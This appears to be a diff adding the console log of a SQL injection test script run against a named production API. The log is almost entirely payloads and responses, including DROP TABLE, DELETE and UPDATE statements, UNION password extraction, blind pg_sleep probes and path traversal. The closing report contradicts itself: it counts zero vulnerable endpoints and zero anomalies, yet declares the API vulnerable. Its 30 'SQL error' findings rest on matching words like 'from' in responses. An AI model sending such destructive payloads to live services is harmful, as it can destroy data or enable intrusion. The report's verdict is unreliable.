@@ -1,0 +1,357 @@
+[95m================================================================================[0m
+[95m COMPREHENSIVE SQL INJECTION TESTING SUITE[0m
+[95m Vaunt API Security Assessment[0m
+[95m================================================================================[0m
+[94m
+Test started: 2025-11-05 17:48:19.801244[0m
+[94mTarget API: https://vauntapi.flyvaunt.com[0m
+[94mTest user: 20254[0m
+[95m
+================================================================================[0m
+[95mTEST SUITE 1: AUTHENTICATION ENDPOINT SQL INJECTION[0m
+[95m================================================================================[0m
+[94m
+1.1 Testing /v1/auth/initiateSignIn - phoneNumber field[0m
+[94m  Testing: ' OR '1'='1[0m
+    → Status: 400, Time: 0.26s
+[94m  Testing: ' OR 1=1--[0m
+    → Status: 400, Time: 0.30s
+[94m  Testing: ' OR 'x'='x[0m
+    → Status: 400, Time: 0.13s
+[94m  Testing: ') OR ('1'='1[0m
+    → Status: 400, Time: 0.30s
+[94m  Testing: ' OR '1'='1' --[0m
+    → Status: 400, Time: 0.12s
+[94m
+1.2 Testing time-based blind SQL injection on phoneNumber[0m
+[94m  PostgreSQL payload: '; SELECT pg_sleep(5)--[0m
+    → Status: 400, Time: 0.12s
+[94m  PostgreSQL payload: ' AND (SELECT 1 FROM pg_sleep(5))--[0m
+    → Status: 400, Time: 0.31s
+[94m  PostgreSQL payload: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) [0m
+    → Status: 400, Time: 0.13s
+[94m  MySQL payload: ' AND SLEEP(5)--[0m
+    → Status: 400, Time: 0.13s
+[94m  MySQL payload: ' OR SLEEP(5)--[0m
+    → Status: 400, Time: 0.14s
+[94m
+1.3 Testing /v1/auth/completeSignIn - challengeCode field[0m
+[94m  Testing: ' OR '1'='1[0m
+    → Status: 400, Time: 0.12s
+[94m  Testing: ' OR 1=1--[0m
+    → Status: 400, Time: 0.12s
+[94m  Testing: ' OR 'x'='x[0m
+    → Status: 400, Time: 0.12s
+[94m
+1.4 Testing error-based SQL injection on auth endpoints[0m
+[94m  Testing: ' AND 1=CAST((SELECT version()) AS int)--[0m
+    → Status: 400
+[94m  Testing: ' AND 1::int=version()::text--[0m
+    → Status: 400
+[94m  Testing: ' AND 1=CONVERT(int, @@version)--[0m
+    → Status: 400
+[94m  Testing: ' AND extractvalue(1, concat(0x7e, version()))--[0m
+    → Status: 400
+[95m
+================================================================================[0m
+[95mTEST SUITE 2: USER PROFILE SQL INJECTION[0m
+[95m================================================================================[0m
+[94m
+2.1 Testing PATCH /v1/user - firstName field[0m
+[94m
+  Testing field: firstName[0m
+[94m    Payload: ' OR '1'='1[0m
+      → Status: 200, Time: 0.49s
+[94m    Payload: '; DROP TABLE users--[0m
+[91m  🚨 SQL ERROR DETECTED: table[0m
+      → Status: 200, Time: 0.35s
+[94m    Payload: ' UNION SELECT * FROM users--[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+      → Status: 200, Time: 0.36s
+[94m
+  Testing field: lastName[0m
+[94m    Payload: admin'--[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+      → Status: 200, Time: 0.40s
+[94m    Payload: ' OR 1=1#[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+      → Status: 200, Time: 0.33s
+[94m    Payload: '; INSERT INTO users VALUES('hacked')--[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+      → Status: 200, Time: 0.34s
+[94m
+  Testing field: email[0m
+[94m    Payload: test@test.com' OR '1'='1[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+      → Status: 200, Time: 0.65s
+[94m    Payload: ' UNION SELECT password FROM users--[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+      → Status: 200, Time: 0.62s
+[94m
+  Testing field: phoneNumber[0m
+[94m    Payload: +1' OR 1=1--[0m
+      → Status: 500, Time: 0.13s
+[94m    Payload: +13035234453'; DROP TABLE--[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+      → Status: 200, Time: 0.60s
+[94m
+  Testing field: weight[0m
+[94m    Payload: 100' OR '1'='1[0m
+      → Status: 500, Time: 0.15s
+[94m    Payload: 150'; DELETE FROM users--[0m
+      → Status: 500, Time: 0.13s
+[94m
+2.2 Testing GET /v1/user with SQL injection in query params[0m
+[94m  Testing parameter: id[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → ' OR '1'='1                    Status: 200
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → ' OR 1=1--                     Status: 200
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → ' OR 'x'='x                    Status: 200
+[94m  Testing parameter: search[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → ' OR '1'='1                    Status: 200
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → ' OR 1=1--                     Status: 200
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → ' OR 'x'='x                    Status: 200
+[94m  Testing parameter: filter[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → ' OR '1'='1                    Status: 200
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → ' OR 1=1--                     Status: 200
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → ' OR 'x'='x                    Status: 200
+[94m  Testing parameter: userId[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → ' OR '1'='1                    Status: 200
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → ' OR 1=1--                     Status: 200
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → ' OR 'x'='x                    Status: 200
+[94m
+2.3 Testing time-based blind SQL on user updates[0m
+[94m  Testing: '; SELECT pg_sleep(5)--[0m
+[91m  🚨 SQL ERROR DETECTED: pg_[0m
+[92m  🔍 DATABASE DETECTED: POSTGRESQL[0m
+    → Status: 200, Time: 0.41s
+[94m  Testing: ' AND (SELECT 1 FROM pg_sleep(5))--[0m
+[91m  🚨 SQL ERROR DETECTED: pg_[0m
+    → Status: 200, Time: 0.33s
+[95m
+================================================================================[0m
+[95mTEST SUITE 3: FLIGHT ENDPOINTS SQL INJECTION[0m
+[95m================================================================================[0m
+[94m
+3.1 Testing GET /v1/flight with SQL injection in query params[0m
+[94m  Testing parameter: id[0m
+    → ' OR '1'='1                    Status: 200
+    → ' OR 1=1--                     Status: 200
+    → ' OR 'x'='x                    Status: 200
+    → ') OR ('1'='1                  Status: 200
+[94m  Testing parameter: status[0m
+    → ' OR '1'='1                    Status: 200
+    → ' OR 1=1--                     Status: 200
+    → ' OR 'x'='x                    Status: 200
+    → ') OR ('1'='1                  Status: 200
+[94m  Testing parameter: search[0m
+    → ' OR '1'='1                    Status: 200
+    → ' OR 1=1--                     Status: 200
+    → ' OR 'x'='x                    Status: 200
+    → ') OR ('1'='1                  Status: 200
+[94m  Testing parameter: filter[0m
+    → ' OR '1'='1                    Status: 200
+    → ' OR 1=1--                     Status: 200
+    → ' OR 'x'='x                    Status: 200
+    → ') OR ('1'='1                  Status: 200
+[94m  Testing parameter: includeExpired[0m
+    → ' OR '1'='1                    Status: 200
+    → ' OR 1=1--                     Status: 200
+    → ' OR 'x'='x                    Status: 200
+    → ') OR ('1'='1                  Status: 200
+[94m
+3.2 Testing UNION-based SQL injection on flights[0m
+[94m  Testing: ' UNION SELECT NULL--[0m
+    → Status: 200, Length: 298843
+[94m  Testing: ' UNION SELECT NULL,NULL--[0m
+    → Status: 200, Length: 298843
+[94m  Testing: ' UNION SELECT NULL,NULL,NULL--[0m
+    → Status: 200, Length: 298843
+[94m  Testing: ' UNION SELECT NULL,NULL,NULL,NULL--[0m
+    → Status: 200, Length: 298843
+[94m  Testing: ' UNION SELECT NULL,NULL,NULL,NULL,NULL--[0m
+    → Status: 200, Length: 298843
+[94m
+3.3 Testing SQL injection in flight ID path parameter[0m
+[94m  Testing: /v1/flight/' OR '1'='1[0m
+    → Status: 404
+[94m  Testing: /v1/flight/' OR 1=1--[0m
+    → Status: 404
+[94m  Testing: /v1/flight/' OR 'x'='x[0m
+    → Status: 404
+[94m  Testing: /v1/flight/') OR ('1'='1[0m
+    → Status: 404
+[94m  Testing: /v1/flight/' OR '1'='1' --[0m
+    → Status: 404
+[94m
+3.4 Testing v2 flight API endpoints[0m
+[94m  Testing POST /v2/flight/8800' OR '1'='1/enter[0m
+    → Status: 400
+[94m  Testing POST /v2/flight/8800; DROP TABLE--/enter[0m
+[91m  🚨 SQL ERROR DETECTED: table[0m
+    → Status: 400
+[94m  Testing POST /v2/flight/8800' UNION SELECT--/enter[0m
+[91m  🚨 SQL ERROR DETECTED: select[0m
+    → Status: 400
+[94m
+3.5 Testing v3 flight API endpoints[0m
+  → Status: 400
+[94m
+3.6 Testing GET /v1/flight-history[0m
+[94m  Testing: ' UNION SELECT NULL--[0m
+    → Status: 200, Length: 19520
+[94m  Testing: ' UNION SELECT NULL,NULL--[0m
+    → Status: 200, Length: 19520
+[94m  Testing: ' UNION SELECT NULL,NULL,NULL--[0m
+    → Status: 200, Length: 19520
+[95m
+================================================================================[0m
+[95mTEST SUITE 4: BOOLEAN-BASED BLIND SQL INJECTION[0m
+[95m================================================================================[0m
+[94m
+4.1 Testing boolean-based blind SQL on flight queries[0m
+[94m
+  Testing pair: TRUE(' AND '1'='1) vs FALSE(' AND '1'='2)[0m
+    TRUE:  Status=200, Length=298843, Time=1.88s
+    FALSE: Status=200, Length=298843, Time=1.82s
+[94m
+  Testing pair: TRUE(' OR '1'='1) vs FALSE(' AND 1=2--)[0m
+    TRUE:  Status=200, Length=298843, Time=1.75s
+    FALSE: Status=200, Length=298843, Time=1.52s
+[94m
+  Testing pair: TRUE(1' AND 1=1--) vs FALSE(1' AND 1=0--)[0m
+    TRUE:  Status=200, Length=298843, Time=1.49s
+    FALSE: Status=200, Length=298843, Time=1.47s
+[95m
+================================================================================[0m
+[95mTEST SUITE 5: SECOND-ORDER SQL INJECTION[0m
+[95m================================================================================[0m
+[94m
+5.1 Storing malicious payload in user profile[0m
+[94m  Storing payload: ' OR 1=1--[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → Store Status: 200
+[94m  Triggering payload by reading user data[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → Trigger Status: 200
+[94m  Checking flight history (potential trigger point)[0m
+    → History Status: 200
+[94m  Storing payload: '; DROP TABLE users--[0m
+[91m  🚨 SQL ERROR DETECTED: table[0m
+    → Store Status: 200
+[94m  Triggering payload by reading user data[0m
+[91m  🚨 SQL ERROR DETECTED: table[0m
+    → Trigger Status: 200
+[94m  Checking flight history (potential trigger point)[0m
+    → History Status: 200
+[94m  Storing payload: ' UNION SELECT password FROM users--[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → Store Status: 200
+[94m  Triggering payload by reading user data[0m
+[91m  🚨 SQL ERROR DETECTED: from[0m
+    → Trigger Status: 200
+[94m  Checking flight history (potential trigger point)[0m
+    → History Status: 200
+[95m
+================================================================================[0m
+[95mTEST SUITE 6: ORM INJECTION (Sequelize/TypeORM)[0m
+[95m================================================================================[0m
+[94m
+6.1 Testing ORM injection in order/sort parameters[0m
+[94m  Testing order parameter: id; DROP TABLE users--[0m
+    → Status: 200
+[94m  Testing order parameter: createdAt; DELETE FROM subscriptions--[0m
+    → Status: 200
+[94m  Testing order parameter: updatedAt; UPDATE users SET priorityScore=999999999--[0m
+    → Status: 200
+[94m  Testing order parameter: ../../../etc/passwd[0m
+    → Status: 200
+[94m  Testing order parameter: __proto__[0m
+    → Status: 200
+[94m  Testing order parameter: constructor.prototype[0m
+    → Status: 200
+[94m
+6.2 Testing JSON-based ORM injection[0m
+[91m
+
+Test suite error: name 'null' is not defined[0m
+[95m
+================================================================================[0m
+[95m FINAL SECURITY ASSESSMENT REPORT[0m
+[95m================================================================================[0m
+[94m
+📊 TEST STATISTICS:[0m
+[94m  Total tests performed: 101[0m
+[94m  Unique vulnerable endpoints: 0[0m
+[94m  Time-based anomalies detected: 0[0m
+[94m  SQL error leakages found: 30[0m
+[94m  Total findings: 30[0m
+[92m
+🗄️  DATABASE DETECTED: POSTGRESQL[0m
+[94m
+🚨 FINDINGS BY SEVERITY:[0m
+[94m  CRITICAL: 0[0m
+[93m  HIGH: 30[0m
+[94m  MEDIUM: 0[0m
+[93m
+⚠️  HIGH SEVERITY FINDINGS:[0m
+[93m  1. SQL Error Leakage at /v1/user[0m
+[93m  2. SQL Error Leakage at /v1/user[0m
+[93m  3. SQL Error Leakage at /v1/user[0m
+[93m  4. SQL Error Leakage at /v1/user[0m
+[93m  5. SQL Error Leakage at /v1/user[0m
+[93m  6. SQL Error Leakage at /v1/user[0m
+[93m  7. SQL Error Leakage at /v1/user[0m
+[93m  8. SQL Error Leakage at /v1/user[0m
+[93m  9. SQL Error Leakage at /v1/user[0m
+[93m  10. SQL Error Leakage at /v1/user[0m
+[93m  11. SQL Error Leakage at /v1/user[0m
+[93m  12. SQL Error Leakage at /v1/user[0m
+[93m  13. SQL Error Leakage at /v1/user[0m
+[93m  14. SQL Error Leakage at /v1/user[0m
+[93m  15. SQL Error Leakage at /v1/user[0m
+[93m  16. SQL Error Leakage at /v1/user[0m
+[93m  17. SQL Error Leakage at /v1/user[0m
+[93m  18. SQL Error Leakage at /v1/user[0m
+[93m  19. SQL Error Leakage at /v1/user[0m
+[93m  20. SQL Error Leakage at /v1/user[0m
+[93m  21. SQL Error Leakage at /v1/user[0m
+[93m  22. SQL Error Leakage at /v1/user[0m
+[93m  23. SQL Error Leakage at /v2/flight/8800%3B%20DROP%20TABLE--/enter[0m
+[93m  24. SQL Error Leakage at /v2/flight/8800%27%20UNION%20SELECT--/enter[0m
+[93m  25. SQL Error Leakage at /v1/user[0m
+[93m  26. SQL Error Leakage at /v1/user[0m
+[93m  27. SQL Error Leakage at /v1/user[0m
+[93m  28. SQL Error Leakage at /v1/user[0m
+[93m  29. SQL Error Leakage at /v1/user[0m
+[93m  30. SQL Error Leakage at /v1/user[0m
+[94m
+📈 CVSS SCORES:[0m
+[93m  Overall CVSS: 7.5 (HIGH)[0m
+[92m
+💾 Detailed results saved to: sql_injection_comprehensive_results_1762364981.json[0m
+[94m
+================================================================================[0m
+[91m❌ VULNERABILITY STATUS: VULNERABLE TO SQL INJECTION[0m
+[94m
+CRITICAL: The Vaunt API is vulnerable to SQL injection attacks![0m
+[94mAttackers can potentially:[0m
+[94m  • Extract sensitive data (user info, payment details, etc.)[0m
+[94m  • Modify database records[0m
+[94m  • Delete data[0m
+[94m  • Bypass authentication[0m
+[94m  • Escalate privileges[0m
+[94m
+Test completed: 2025-11-05 17:49:41.595079[0m
+[94m================================================================================[0m
